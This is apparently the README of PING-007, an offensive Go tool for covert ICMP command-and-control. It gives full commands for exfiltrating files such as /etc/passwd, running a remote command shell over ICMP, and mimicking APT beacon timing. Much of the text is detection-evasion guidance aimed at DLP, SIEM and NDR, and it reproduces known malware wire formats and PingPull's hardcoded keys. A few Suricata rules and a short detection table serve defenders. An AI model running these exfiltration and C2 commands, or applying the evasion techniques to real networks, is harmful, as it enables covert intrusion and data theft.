# PING-007 v3.0: Covert ICMP C2 Framework

PING-007 is a Go framework for covert ICMP communication designed for authorized penetration testing, red team operations, and security research. It embeds encrypted data inside legitimate-looking ICMP ping packets with multi-packet stealth reassembly and APT-grade timing evasion.

[![Go Version](https://img.shields.io/badge/go-1.25+-blue)]()
[![Crypto](https://img.shields.io/badge/crypto-AES256%20%7C%20ChaCha20%20%7C%20XOR--CFB--HMAC-green)]()
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey)]()

> **Requires elevated privileges** — raw ICMP sockets (`SOCK_RAW + IPPROTO_ICMP`) bypass the transport layer and need `CAP_NET_RAW` on Linux/macOS, Administrator on Windows.

---

## Privileges

### Why root is required

Ping-007 opens a raw ICMP socket to both craft outgoing packets (custom OS signature, XOR steganography) and capture **all** incoming ICMP traffic on the interface — not just replies to its own pings. The kernel gates this behind `CAP_NET_RAW` because raw sockets can sniff traffic and forge arbitrary source IPs.

Normal tools like `curl` or `nc` use TCP/UDP sockets where the kernel handles framing — no elevated privileges needed. Ping-007 works at the IP layer directly, which is why the requirement exists.

**This is not a PING-007 limitation — it is a property of the technique itself.** The two documented APT tools that used ICMP as a primary C2 channel (Pingback, 2021 and PingPull/GALLIUM, 2022) had the exact same constraint. Pingback required admin to write `oci.dll` into `System32` and reconfigure MSDTC; PingPull required admin to install its Windows service (`sc create`). Neither was a "non-admin" tool — they arrived with privileges already acquired through prior exploitation, then opened raw sockets from that elevated context. In real Red Team engagements, PING-007 is deployed the same way: post-exploitation, once a privileged shell is available. The privilege requirement is not a barrier — it is the normal operational context for any post-exploitation tooling.

### Linux / macOS

```bash
# Standard — run as root
sudo ./build/ping-007 listen -o ./loot -p "key"

# Alternative — assign capability to the binary (dev/lab only)
sudo setcap cap_net_raw+ep ./build/ping-007
./build/ping-007 listen -o ./loot -p "key"   # no sudo needed
```

> **OPSEC warning on `setcap`:** the capability is stored in the file's extended attributes and is readable by anyone:
> ```bash
> getcap ./build/ping-007
> # → ./build/ping-007 = cap_net_raw+ep
> find / -xdev 2>/dev/null | xargs getcap 2>/dev/null  # defenders run this
> ```
> In real operations, use `sudo` or a root shell — no persistent artifact on the binary.

This mirrors how `ping` itself works on modern Linux:
```bash
getcap /usr/bin/ping
# /usr/bin/ping = cap_net_raw+ep
```

### Windows

Windows has no fine-grained capability system like `CAP_NET_RAW` — there is no `setcap` equivalent. The only way to open a raw socket is to run as **Administrator**. No workaround exists.

```powershell
# Right-click terminal → "Run as Administrator", then:
.\build\ping-007.exe listen -o .\loot -p "key"
```

**Windows caveats (raw sockets since XP SP2):**

| Issue | Detail |
|-------|--------|
| **Privilege** | Administrator mandatory — no capability workaround unlike Linux `setcap` |
| **Firewall** | Windows Defender blocks **inbound** ICMP by default. The listener won't receive packets until a rule is added (see below). Outbound ICMP (sender) works without changes. |
| **Loopback** | Raw sockets cannot receive packets sent to `127.0.0.1` on Windows — single-machine testing doesn't work. Use two separate hosts. |
| **Source IP** | Raw socket sends are allowed as Admin, but the source IP cannot be spoofed — Windows enforces a valid local IP. |
| **Tested** | ⚠ Cross-compiled but **not validated end-to-end on Windows** — use Linux for critical ops. |

**Note on enterprise networks:** ICMP is almost universally allowed on corporate LANs. Network teams rely on it for troubleshooting (ping, traceroute, path MTU discovery) and rarely restrict it internally. This is precisely what makes ICMP a reliable covert channel in lateral movement scenarios — the traffic blends in with normal infrastructure monitoring. The Windows Defender caveat above applies to the **host firewall only**, not to the network-level policy.

```powershell
# Allow inbound ICMP echo on the local host firewall (listener side only)
netsh advfirewall firewall add rule name="ICMP Allow" protocol=icmpv4:8,any dir=in action=allow

# Remove the rule after testing
netsh advfirewall firewall delete rule name="ICMP Allow"
```

---

## Installation

```bash
git clone https://github.com/franckferman/ping-007
cd ping-007
make build            # binary → build/ping-007
sudo make install     # install to /usr/local/bin/ping-007 (optional)
```

Requirements: Go 1.25+, sudo/root, ICMP-capable network interface.

---

## Command Overview

```
ping-007 basic    — send a message (inline data or file)
ping-007 stealth  — send with stealth mode forced on
ping-007 exfil    — exfiltrate a file in chunks
ping-007 shell    — interactive bidirectional C2 shell over ICMP
ping-007 listen   — receive/decrypt incoming data
ping-007 apt      — APT group timing simulation
ping-007 analyze  — passive network analysis
ping-007 status   — framework health check
```

---

## Usage

### Encryption modes

| Situation | Command | Result |
|-----------|---------|--------|
| **No `-p` flag** | `sudo ./ping-007 basic -t <ip> -d "msg"` | **Warning: random key** — receiver can't decrypt. Non-interoperable. |
| **Shared password** | `sudo ./ping-007 basic -t <ip> -d "msg" -p "secret"` | AES-256-GCM, PBKDF2-derived key. Receiver with same `-p` decrypts automatically. |
| **No encryption** | `sudo ./ping-007 exfil -t <ip> -f file --no-encrypt` | Plaintext payload in ICMP. Receiver gets raw bytes. |

> Without `-p`, the binary prints:
> `Warning: No password or keyfile - using random keys (non-interoperable)`

---

### 1. Send a message (basic)

```bash
# Encrypted with shared password
sudo ./build/ping-007 basic -t 192.168.1.100 -p "mypassword" -d "operation alpha"

# Receive it
sudo ./build/ping-007 listen -o ./received -p "mypassword" --timeout 30
```

### 2. Exfiltrate a file

```bash
# Sender
sudo ./build/ping-007 exfil -t 192.168.1.100 -f /etc/passwd -p "mypassword" --mode fast

# Receiver
sudo ./build/ping-007 listen -o ./loot -p "mypassword" --timeout 120
```

`--mode fast` disables APT timing delays. `--mode stealth` (default) adds delays per chunk. `--mode covert` uses alternate patterns.

### 3. Bidirectional C2 shell

The listener executes incoming commands and sends results back encrypted over ICMP.

```bash
# Terminal 1 — target machine (agent/listener)
sudo ./build/ping-007 listen -o /tmp/c2 -p "c2pass" --timeout 3600

# Terminal 2 — operator (C2 client)
sudo ./build/ping-007 shell -t <TARGET_IP> -p "c2pass"
# ping-007> id
# uid=0(root) gid=0(root) ...
# ping-007> whoami
# root
# ping-007> exit
```

The shell sends `CMD:<id>:<command>` packets encrypted; the listener executes and replies `RESP:<id>:<success>:<rc>:<stdout>:<stderr>` encrypted.

> `--mode batch` executes commands locally (no ICMP, for offline testing only).

### 4. APT timing simulation

```bash
sudo ./build/ping-007 apt -t 192.168.1.100 -r lazarus --duration 300 -p "mypassword"
```

Available profiles: `lazarus` (5min–1hr delays), `apt29` (30min–2hr), `apt28` (10–30min), `equation` (1–3 days).

---

## Flag Reference

### Global flags (all commands)
| Flag | Default | Description |
|------|---------|-------------|
| `-p, --password` | — | Shared password for AES-256-GCM + PBKDF2 key derivation |
| `-v, --verbose` | false | Verbose logging |
| `--no-banner` | false | Suppress startup banner and JSON logs |
| `-c, --config` | — | Config file path (default: `./config/ping-007.yml`) |
| `--allow-all-targets` | false | Bypass `authorized_targets` / `forbidden_targets` CIDR validation — use in lab or red team ops where the config whitelist would block the actual target |

### `basic`
| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-d, --data` | — | Inline data to transmit |
| `--signature` | `linux` | OS ping signature to mimic (`linux`, `windows`, `none`) |
| `--no-signature` | false | Raw ICMP, no OS pattern |
| `-s, --stealth` | false | Force stealth mode (64-byte, proper timing) |
| `--delay` | 0 | Pre-transmission delay (e.g. `2s`, `500ms`) |
| `--human-timing` | false | Random 1–5s intervals between packets |
| `--ultra-stealth` | false | Maximum evasion (timing + size + pattern) |
| `--decoy-pings` | 0 | Send N clean OS-pattern pings before data — paranoid mode for environments with active ICMP monitoring (NDR/Zeek). Not needed against standard SIEMs which ignore ICMP. |
| `--after-pings` | 0 | Send N clean pings after data to close the session naturally — same use case as `--decoy-pings` |
| `--ping-interval` | `1s` | Interval between pings in a sequence (mirrors real `ping`) |
| `--no-encrypt` | false | Send plaintext — no encryption, no encoding (raw bytes in ICMP) |
| `--encode` | false | Base64-encode payload without encrypting (lower entropy than AES, no confidentiality) |
| `-i, --interactive` | false | Interactive prompt mode |

### `exfil`
| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-f, --file` | **required** | File to exfiltrate |
| `--method` | `icmp_tunnel` | Transfer method (`icmp_tunnel`, `icmp_payload`) |
| `--mode` | `stealth` | Timing mode (`stealth`, `fast`, `covert`) |
| `--chunk-size` | 512 | Base chunk size in bytes (±25% jitter applied per chunk) |
| `--no-stealth` | false | Disable stealth techniques |
| `--no-encrypt` | false | Disable encryption (plaintext payload) |
| `--signature` | `linux` | OS signature for TTL mimicry (`linux`, `windows`, `none`) |

### `shell`
| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `--mode` | `interactive` | `interactive` (ICMP C2) or `batch` (local execution only) |
| `--jitter` | 0 | Max random delay before each outgoing packet (e.g. `3s`); 0 = disabled |

### `listen`
| Flag | Default | Description |
|------|---------|-------------|
| `-o, --output` | `./received` | Output directory for received files |
| `--interface` | `eth0` | Network interface to listen on |
| `--method` | `icmp_tunnel` | Listen method (`icmp_tunnel`) |
| `--timeout` | 60 | Timeout in seconds |
| `-q, --quiet` | false | Suppress per-packet output (for real ops — verbose log is an OpSec risk) |

### `apt`
| Flag | Default | Description |
|------|---------|-------------|
| `-t, --target` | **required** | Target IP address |
| `-r, --profile` | **required** | APT profile (`lazarus`, `apt29`, `apt28`, `equation`) |
| `--duration` | 60 | Simulation duration in seconds |

### `analyze`
| Flag | Default | Description |
|------|---------|-------------|
| `--duration` | 60 | Analysis duration in seconds |
| `--passive` | false | Passive mode (no raw sockets, no root required) |

---

## Why PING-007 vs. other ICMP tools

There are several open-source tools for ICMP exfiltration and tunneling — icmpsh, ptunnel, Hans, icmptunnel, ncat, hping3, Cobalt Strike's ICMP beacon. They all work. None of them try to look like a real `ping`.

### What typical tools do

| Aspect | icmpsh | ptunnel | Cobalt Strike ICMP | PING-007 |
|--------|--------|---------|-------------------|----------|
| Payload size | Arbitrary (e.g. 200–1500B) | Arbitrary (TCP tunnel overhead) | Fixed but non-standard | **Exact OS size — 64B (Linux) / 40B (Windows)** |
| Payload content | Plaintext commands in raw bytes | TCP framing in ICMP payload | Arbitrary encrypted blob | **XOR'd into real OS ping pattern** |
| TTL | Kernel default (unset) | Kernel default | Uncontrolled | **setsockopt(IP_TTL): 64 or 128 per signature** |
| ICMP identifier | PID or static constant | Fixed magic constant | Session-based but non-OS | **crypto/rand 16-bit per session** |
| Sequence number | Starts at 0 | Starts at 0 | Session counter | **crypto/rand random start** |
| Timing | Blast or fixed interval | Burst (TCP throughput-driven) | Configurable beacon interval | **1s ± 10% jitter (mirrors real ping)** |
| Fragment strategy | Oversized single packets or IP fragmentation | Oversized ICMP (MTU-sized) | Single large packet | **N × 64B echo requests, each identical to a real ping** |
| Decoy traffic | None | None | None | **--decoy-pings / --after-pings: clean OS pings before and after** |
| Encryption | None (icmpsh is plaintext) | None by default | XOR or AES (payload) | **AES-256-GCM / ChaCha20-Poly1305 / XOR-CFB-HMAC + PBKDF2** |
| Detectable by packet size? | Yes — always | Yes — always | Yes | **No — identical to `ping -s 56`** |
| Detectable by pattern mismatch? | Yes — raw bytes | Yes — TCP headers in ICMP | Yes — non-OS payload | **No — payload is the OS pattern, XOR'd** |

### The concrete differentiators

**1 — Packet size never deviates from a real ping.**
icmpsh and ptunnel send oversized ICMP packets — the size anomaly alone triggers a Snort/Suricata rule. PING-007 always produces 64-byte ICMP frames on Linux, 40-byte on Windows. A single packet size rule cannot distinguish it from `ping`.

**2 — XOR steganography into OS-native payload pattern.**
Linux `ping` produces `[8B struct timeval LE][0x08, 0x09, 0x0A, …]`. Windows `ping` produces `abcdefghijklmnopqrstuvwabcdefghi`. PING-007 XOR-embeds data into these exact patterns byte by byte. Without the key, a packet capture shows the expected pattern with slightly noisy bytes — visually consistent with normal network jitter or a slightly modified ping implementation. Other tools write raw encrypted or plaintext bytes directly into the payload — immediately visible as non-ping traffic.

**3 — TTL is set explicitly per OS signature via setsockopt.**
Not setting the TTL lets the kernel use its process-default (typically 64 on Linux regardless of the `--signature windows` intent). PING-007 calls `setsockopt(IP_TTL, 64)` for Linux, `setsockopt(IP_TTL, 128)` for Windows. A passive OS fingerprint via TTL returns the correct OS. Other tools are trivially fingerprinted this way.

**4 — ICMP identifier is not the PID.**
Most raw-socket tools use `getpid() & 0xFFFF` as the ICMP echo identifier — standard practice for `ping` itself, but fatal for a long-running covert tool: a fixed 16-bit identifier across hundreds of packets is a statistically rare pattern. PING-007 generates the identifier from `crypto/rand` per session.

**5 — Sequence number starts randomly.**
Real users start at 1. Scanners and C2 tools start at 0. PING-007 starts at a `crypto/rand` value — matching the behaviour of a session that began at an unknown time, not a fresh invocation.

**6 — Multi-packet fragmentation never produces oversized packets.**
When data exceeds single-packet capacity (46 bytes on Linux, 22 on Windows), PING-007 splits it into N separate ICMP echo requests, each exactly 64/40 bytes, with a 4-byte embedded header `[0xA7 magic][session][frag_id][total_frags]` XOR'd into the payload pattern. Other tools either send IP-level fragments (visible as fragmented IP datagrams — a strong anomaly signal) or single large ICMP packets. PING-007 produces a series of normal-looking pings at 1-second intervals.

**7 — Decoy pings — optional layer for environments with ICMP monitoring.**
In most enterprise networks, ICMP is not fed to SIEM correlation rules at all (see DLP section). `--decoy-pings` is a paranoid-mode flag for the minority case: environments running NDR (Vectra, Darktrace) or Zeek with ICMP behavioral rules. When needed, `--decoy-pings 5 --after-pings 5` wraps data packets in 5 clean OS-pattern pings before and after. The session becomes indistinguishable from `ping -c 11 target` even under full packet capture analysis.

**8 — Encryption does not use a custom wire format visible as non-ping.**
The 32-byte crypto overhead (4B header + 12B nonce + 16B AEAD tag) fits inside the 46-byte stealth capacity for small payloads. For anything larger, auto-fragmentation kicks in — the overhead is absorbed across fragments, never produces a packet that exceeds the OS standard size.

### What a Wireshark trace looks like

```
# icmpsh sending "whoami" command
Frame 42: 8.0.0.1 → 10.x.x.x  ICMP Echo (ping) request  id=0x1A2B, seq=0, len=200
  ↑ 200 bytes, seq=0, static id — trivially flagged by any ICMP anomaly rule

# PING-007 sending the same command (--signature linux)
Frame 42: 8.0.0.1 → 10.x.x.x  ICMP Echo (ping) request  id=0xE73F, seq=4823, len=64
  Payload: 00 00 00 00 00 00 00 08  e3 1a 7f 2c 09 5d b8 4e  │...............│
           a1 f2 0b 3e 11 5a c9 7d  ...
  ↑ 64 bytes, random id, random seq, payload looks like a ping with normal jitter
```

Without PING-007's key, a Blue Team analyst looking at the second capture sees a standard Linux ping. The only behavioral anomaly is the destination IP being unusual — which is why `--decoy-pings` matters for targets that already receive periodic ICMP traffic.

---

## APT-Grade ICMP Tools in the Wild

Two tools with published technical reports have used ICMP as a primary C2 channel. A third (PHOREAL/APT32) used ICMP as one of four interchangeable protocols.

All three had the right premise: ICMP is largely ignored by defenders. None asked the next question: **"does my packet actually look like a real OS ping?"** They just stuffed data into the payload field and shipped it. The result was trivially detectable static signatures — a one-liner Suricata rule for Pingback, a binary reverse for PingPull. PING-007 was built specifically to answer that question correctly.

Sources: [Trustwave SpiderLabs (2021)](https://levelblue.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/) · [Unit42 / Palo Alto Networks (2022)](https://unit42.paloaltonetworks.com/pingpull-gallium/) · [Corelight Zeek detection (2021)](https://github.com/corelight/pingback) · [Mandiant APT32 (2017–2020)](https://attack.mitre.org/groups/G0050/)

---

### Pingback (2021) — Trustwave SpiderLabs

Windows backdoor, unattributed. Delivered as a malicious `oci.dll` that the MSDTC service loads via `MTXOCI.DLL` (DLL search order hijacking — no legit `oci.dll` exists in the Windows system directory by default).

**ICMP wire format:**

```
ICMP Type 8 (Echo Request)
Payload: fixed 788 bytes — always exactly 788B, a fixed C struct containing:
  [cmd field][cmdline field][...padding to 788B]
Sequence number: one of exactly {1234, 1235, 1236}
  1234 → packet contains a command or data
  1235 → acknowledgment: data received at the other end
  1236 → notification: new data incoming
```

The sniffer ignores every ICMP packet that does not match exactly these three sequence numbers. No other filtering — no encryption, no authentication.

**Commands supported:** `shell`, `exec`, `exep`, `rexec`, `download` / `download2` / `download3`, `upload` / `upload2` / `upload3`

**Download/upload modes (numbered suffix):**
- Mode 1 → TCP callback: malware connects to attacker-supplied IP:port
- Mode 2 → TCP listen: malware binds a port, waits for attacker connection
- Mode 3 → Pure ICMP: file transfer over ICMP only (acknowledged as "slower than TCP, only 1 packet at a time, unreliable")

**No encryption whatsoever** — commands and responses travel in plaintext inside the 788-byte struct.

**Persistence:** updata.exe reconfigures MSDTC to start automatically as a service.

**Detection — why it was caught within days:**

Corelight published a [Zeek detection package](https://github.com/corelight/pingback) based on three trivially observable artifacts:

1. **Payload size = 788 bytes** — no OS ping ever produces a 788-byte ICMP payload. `ping -s 56` (Linux) = 64-byte total. Windows `ping` = 40-byte total. `788` is an immediate hard anomaly.
2. **Sequence numbers ∈ {1234, 1235, 1236}** — a restricted 3-value set across an entire session is statistically impossible for legitimate traffic. In network byte order (as Zeek reads them): {53764, 54020, 54276}.
3. **Plaintext command at offset 0** — "shell\x00\x00\x00...", "download\x00..." directly in the ICMP payload, matchable with a Suricata content rule.

Minimal Suricata signature catching 100% of Pingback sessions:
```
alert icmp any any -> any any (itype:8; dsize:788; sid:9000010;)
```

---

### PingPull (2022) — GALLIUM / Alloy Taurus · Unit42 / Palo Alto Networks

Chinese state-sponsored group (GALLIUM, also Softcell / Alloy Taurus), active since at least 2012, targeting telecom / government / finance. PingPull is a RAT with three swappable C2 transports in the same binary: **ICMP**, **HTTPS**, **TCP** — selected at compile time.

**ICMP wire format (verbatim from Unit42 analysis):**

```
[8-byte hardcoded prefix: 03 41 40 7E 04 37 24 70]
R[sequence_number].[PROJECT_IDENTIFIER]\r\n
total=[total_data_length]\r\n
current=[this_chunk_length]\r\n
[base64(AES-256-CBC(payload))]
```

Example identifier: `PROJECT_SAMP.EXE_DESKTOP-U9SM1U2_AC10BD82`
Format: `PROJECT_[EXECUTABLE]_[HOSTNAME]_[HEX_IP]`

**Beacon (heartbeat):** `total=0`, `current=0`, no encrypted payload — sent periodically to signal the implant is alive.

**Fragmentation:** when data exceeds the ICMP payload capacity, sequence number increments and `total`/`current` fields track reassembly — but each packet is still an oversized, non-OS-pattern blob.

**Encryption:** AES-256-CBC, base64-encoded output. Two hardcoded keys identified by Unit42 from analyzed samples:
```
P29456789A1234sS
dC@133321Ikd!D^i
```

**Commands:** `&[KEY]=[command]&z0=[unknown]&z1=[arg1]&z2=[arg2]`

**Persistence:** Windows service with name `Iph1psvc` and display name `IP He1per` — a deliberate typo to visually mimic the legitimate `iphlpsvc` (IP Helper) service.

**Detection — why it was caught:**

- **Payload is not an OS ping pattern**: every packet contains the `03 41 40 7E 04 37 24 70` prefix followed by ASCII `R[n].[PROJECT_...]` — trivially identifiable as non-ping data by any payload-aware sensor.
- **Hardcoded AES keys in binary**: once Unit42 reversed a single PingPull sample, both keys were recovered. Every packet of every PingPull session captured anywhere is retrospectively decryptable with those keys.
- **`PROJECT_` identifier leaks hostname, executable name, and IP** in every packet — a full asset fingerprint in plaintext (the AES wraps the command payload, not the identifier header).

---

### Technical comparison — Pingback vs. PingPull vs. PING-007

| | **Pingback** | **PingPull (GALLIUM)** | **PING-007** |
|---|---|---|---|
| **Packet size** | Fixed **788B** — hard anomaly | Variable, oversized blob | **Exact OS size: 64B (Linux) / 40B (Windows)** |
| **Payload content** | Plaintext C struct — `shell\x00...` at offset 0 | `[8B prefix]R[seq].[PROJECT_...]\r\ntotal=...\r\n[b64-AES]` | **XOR steganography into real OS pattern** (`timeval`+sequential or `abcdefgh...`) |
| **TTL** | Kernel default (uncontrolled) | Kernel default | **`setsockopt(IP_TTL)`: 64 (Linux) / 128 (Windows)** |
| **Sequence numbers** | **Fixed: {1234, 1235, 1236}** — 3 values, entire session | Incremental from 0 | **`crypto/rand` random start, per-session** |
| **ICMP identifier** | Not randomized | Constant per session | **`crypto/rand` 16-bit, per-session** |
| **Encryption** | **None** — commands in cleartext | AES-256-CBC with **2 keys hardcoded in binary** | PBKDF2-SHA256 (100k iter) + AES-256-GCM / ChaCha20-Poly1305 — **no key in binary** |
| **Key derivation** | N/A | Static string baked at compile time | **Runtime password → PBKDF2 → per-algorithm key** |
| **Fragmentation** | None (mode 3 = 1 pkt/transfer, acknowledged as unreliable) | `total`/`current` chunking in oversized packets | **N×64B pings, each identical to OS `ping`; 4B frag header XOR'd into payload** |
| **Persistence mechanism** | DLL hijack `oci.dll` → MSDTC | Windows service `Iph1psvc` (fake `iphlpsvc`) | **Framework only — persistence left to operator** |
| **Leaked asset info** | None (plaintext is command only) | **Hostname + executable + IP in every packet** (`PROJECT_*`) | Nothing leaked — payload is indistinguishable from OS ping |
| **Detectable by payload size?** | **Yes** — `dsize:788` in Suricata catches 100% | **Yes** — oversized, non-OS-pattern packet | **No** — identical to `ping -s 56` |
| **Detectable by sequence #?** | **Yes** — 3 fixed values, trivial Zeek rule | Partially (incremental from 0 is suspicious) | **No** — `crypto/rand` start |
| **Binary reversing compromise?** | N/A (no keys) | **Yes** — both keys recoverable, all historical traffic decryptable | **No** — no key material in binary |
| **OS fingerprint-safe?** | No — non-ping size, default TTL | No — non-ping size, default TTL | **Yes** — exact OS TTL + exact OS payload size |

### Why PING-007 fixes every failure mode

Pingback and PingPull chose ICMP because network defenders rarely inspect it — correct premise. But neither attempted to make their traffic look like an actual OS ping. The result: trivially detectable static signatures.

PING-007 was designed specifically around these documented failure modes:

- **788B anomaly (Pingback)** → PING-007 sends exactly 64B (Linux) or 40B (Windows) — identical to the OS
- **Fixed sequence numbers (Pingback)** → PING-007 uses `crypto/rand` start; Zeek sees a session that could have started at any point
- **Hardcoded AES keys (PingPull)** → PING-007 has zero key material in the binary; keys are derived at runtime from a password via PBKDF2 (100k iterations) — reversing the binary reveals nothing useful
- **`PROJECT_*` identifier leaking hostname/IP (PingPull)** → PING-007 payload is a XOR-masked OS pattern; without the key, a PCAP shows a legitimate-looking ping with minor byte-level noise
- **Default TTL (both)** → PING-007 calls `setsockopt(IP_TTL)` explicitly — OS fingerprint returns the correct value for the selected signature

A detection rule for Pingback (`dsize:788`) or PingPull (`content:"PROJECT_"`) has **zero overlap** with PING-007 traffic.

---

## OPSEC Architecture

Layers of detection evasion applied to make traffic indistinguishable from legitimate ICMP:

| Layer | Technique | SOC detection avoided |
|-------|-----------|----------------------|
| **TTL** | `setsockopt(IP_TTL)` — Linux=64, Windows=128 per `--signature` | OS fingerprinting via TTL |
| **Payload size** | Stealth mode: always 64 bytes (identical to `ping -s 56`) | Oversized ICMP payload detection |
| **Payload pattern** | XOR steganography into real OS ping pattern (timeval+sequential or alphabetic) | Pattern mismatch vs. known ping tools |
| **Sequence number** | `crypto/rand` random start per session (not always 1) | "Sequence starts at 1" heuristic |
| **ICMP Identifier** | `crypto/rand` random 16-bit per session (not static PID) | Fixed identifier = long-running process detection |
| **Fragmentation** | Large payloads split into N×64-byte pings with embedded frag header | Oversized single-packet detection |
| **Timing** | 1s ± 10% jitter between packets (real ping variance) | Fixed-interval Netflow detection |
| **Session blending** | `--decoy-pings` before + `--after-pings` after data (clean OS pings) | ICMP volume anomaly on NDR/Zeek — paranoid mode, most SIEMs ignore ICMP entirely |
| **Inter-chunk gap** | 5–30s (stealth) / 30–120s (covert) between chunks | Burst transfer rate detection |
| **Shell jitter** | `--jitter <max>` random delay before each command packet | Metronomic C2 beacon detection on NDR |
| **Output verbosity** | `listen --quiet` suppresses all stdout | Live forensics / process monitoring |

### What a SOC still can detect

- **High entropy payload**: AES-GCM ciphertext has ~8 bits/byte entropy. Stealth mode XOR with sequential pattern reduces visual obviousness but the underlying entropy is preserved. A DPI engine with entropy scoring can flag this.
- **ICMP volume anomaly** *(rare — requires NDR or Zeek with ICMP rules)*: in environments with active ICMP monitoring (Vectra, Darktrace, custom Zeek scripts), an unusual number of pings to an atypical destination can trigger. This is the minority case — most enterprise SIEMs don't feed ICMP into correlation rules at all (see DLP section below). `--decoy-pings` / `--after-pings` exist for this paranoid scenario: clean OS pings before and after the data make the session look like `ping -c N`.
- **Same destination IP**: periodic pings to the same C2 IP stand out in flow analysis on mature NDR deployments. Route through IPs with pre-existing legitimate ICMP traffic.
- **Fragment magic byte `0xA7`**: Suricata/Snort can match it at offset 8 with a custom rule (see detection section below). Only relevant in sessions with fragmented payloads.

---

## Why Enterprise DLP Cannot See This

> Verified against published research: [Palo Alto LIVEcommunity](https://live.paloaltonetworks.com/t5/general-topics/icmp-covert-channel-allow-only-icmp-ping-packet-that-has/td-p/259933) · [JumpSec Labs](https://labs.jumpsec.com/covert-channels-misusing-icmp-protocol-for-file-transfers-with-scapy/) · [Vectra AI](https://www.vectra.ai/detections/icmp-tunnel) · [APNIC Blog](https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/) · [DeepStrike](https://deepstrike.io/blog/what-is-icmp-tunneling) · [Trisul Analytics](https://www.trisul.org/blog/detecting-icmp-covert-channels-through-payload-analysis/)

Enterprise DLP solutions (Symantec DLP, Forcepoint, Microsoft Purview, etc.) operate as **L7 application proxies** or **SSL inspection engines** targeting HTTP/S, SMTP, FTP and cloud APIs. ICMP is a **network-layer diagnostic protocol** — it has no application session, no TCP stream, and no content to proxy.

**In plain terms: most DLP appliances do not decode ICMP payloads at all.**

> *"Firewalls often permit outbound ICMP by default and only ensure that an Echo Reply matches a recent Echo Request, without inspecting the payload beyond length."* — [DeepStrike Security Research](https://deepstrike.io/blog/what-is-icmp-tunneling)

### Why each layer holds up

#### 1. DLP blind spot — confirmed

Traditional firewalls and the majority of DLP products only check ICMP **type** (8 = request, 0 = reply) and **code** (0 = no error). Payload content is passed through unchecked. Next-gen firewalls with DPI *can* be configured for entropy analysis, but this is rare in practice and generates significant false positives on legitimate network tools.

#### 2. The packet is indistinguishable from a real ping

PING-007 in `--stealth` mode produces **byte-for-byte identical packet structure** to a real OS `ping`:

| Field | Linux `ping -s 56` | Windows `ping` | PING-007 (`--signature linux`) | PING-007 (`--signature windows`) |
|-------|-------------------|----------------|-------------------------------|----------------------------------|
| ICMP type | 8 (echo request) | 8 (echo request) | 8 | 8 |
| Total size | 64 bytes | 40 bytes | 64 bytes | 40 bytes |
| TTL | 64 | 128 | 64 (via `setsockopt`) | 128 (via `setsockopt`) |
| Payload size | 56 bytes | 32 bytes | 56 bytes | 32 bytes |
| Payload structure | `[8B timeval][sequential 0x08,0x09…]` | `abcdefghijklmnopqrstuvwabcdefghi` | same structure, XOR'd with data | same structure, XOR'd with data |

The data is **XOR-steganographically embedded** into the OS payload pattern. The packet size, TTL, and payload format are identical to the real OS. A packet capture without the key looks like a legitimate ping with slightly "noisy" bytes — indistinguishable from normal network jitter.

> *"The default ICMP type 8 echo request for Windows machines is `abcdefghijklmnopqrstuvwabcdefghi` — 32 bytes, the incomplete Latin alphabet."* — [Palo Alto LIVEcommunity](https://live.paloaltonetworks.com/t5/general-topics/icmp-covert-channel-allow-only-icmp-ping-packet-that-has/td-p/259933)

#### 3. On external networks: looks exactly like a user troubleshooting connectivity

With `--jitter`, `--human-timing`, `--decoy-pings` and `--after-pings`:

```
[real pings: 5×] → [data ping] → [real pings: 5×]
   ↑                    ↑              ↑
  clean              64 bytes        clean
 OS pings          looks same       OS pings
```

An analyst watching NetFlow sees: *"user sent 11 pings to 10.x.x.x with 1-5s intervals"*. This is **indistinguishable from an admin doing `ping -c 11 target`**. The TTL hop count, packet sizes, and timing cadence all match human behavior.

Even over the internet: ICMP is almost universally allowed outbound on corporate LANs (firewall rules typically allow it for diagnostic purposes), and inbound ICMP to an external target is treated by transit routers as ordinary network traffic.

#### 4. Chunk size is constant regardless of data size

For large exfiltrations, data is split into **42-byte fragments (Linux) or 18-byte fragments (Windows)**, each carried in a separate 64/40-byte ping. Every packet in the series is **identically sized** — whether you're exfiltrating 1 byte or 1 GB, each individual packet looks the same. There is no "big ICMP packet" anomaly.

#### 5. Encryption blocks content inspection

Even if a sensor decodes the ICMP payload, it finds:
```
[4B header][12B random nonce][ciphertext…][16B AEAD tag]
```
Pure random-looking bytes. No PII patterns, no file headers, no regex match possible. DLP content inspection requires readable text or known file signatures — AES-256-GCM ciphertext provides neither.

#### 6. Proven technique — used in the wild by documented threat actors

ICMP covert channels appear in multiple real-world threat actor toolkits. Three are publicly documented with technical analysis:

- **Pingback** (2021, unattributed) — Windows backdoor via DLL hijacking, ICMP-only C2, fixed 788B payload, sequence numbers {1234/1235/1236} — [Trustwave SpiderLabs](https://levelblue.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/)
- **PingPull** (2022, GALLIUM / likely Chinese state-sponsored) — ICMP + HTTPS + TCP swappable C2, AES-256-CBC with hardcoded keys — [Unit42 / Palo Alto Networks](https://unit42.paloaltonetworks.com/pingpull-gallium/)
- **PHOREAL** (2017+, APT32 / OceanLotus, Vietnam state-sponsored) — multi-channel C2 including ICMP, chosen because "few organizations inspect ICMP traffic" — [Mandiant APT32 reporting](https://attack.mitre.org/groups/G0050/)
- **Cobalt Strike** — ICMP as an optional beacon transport ([Cynet](https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/))
- Academic: *"many network devices consider ICMP traffic benign and will allow it to pass through unmolested"* — [Springer covert channel detection study](https://link.springer.com/content/pdf/10.1007/978-3-540-39737-3_103.pdf)

See [APT-Grade ICMP Tools in the Wild](#apt-grade-icmp-tools-in-the-wild) for a detailed technical comparison of what those tools did and where they failed detection.

### Detection — what Blue Team can do

| Signal | Tool | Difficulty |
|--------|------|-----------|
| Payload entropy > 7.5 bits/byte | Zeek + entropy script | Medium — high FP rate |
| Fragment magic byte `0xA7` at offset 8 | Suricata custom rule | Easy if you know the tool |
| ICMP flood to single external IP | NetFlow / SIEM | Low — triggers on volume not content |
